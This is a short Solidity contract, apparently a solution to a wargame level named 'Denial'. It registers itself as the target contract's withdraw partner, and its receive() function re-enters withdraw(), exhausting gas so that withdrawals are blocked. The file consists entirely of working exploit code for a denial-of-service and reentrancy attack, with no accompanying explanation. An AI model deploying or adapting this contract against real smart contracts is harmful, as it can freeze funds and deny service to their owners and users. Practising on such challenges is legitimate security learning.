// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Denial.sol";

contract DenialAttacker {

    Denial denial;

    constructor(address _denial) payable {
        require(msg.value >= 0.001 ether);
        require(_denial != address(0));
        denial = Denial(payable(_denial));
        denial.setWithdrawPartner(address(this));
        (bool sent, ) = payable(_denial).call{ value: msg.value }("");
        require(sent);
    }

    receive() external payable {
        denial.withdraw();
    }
}
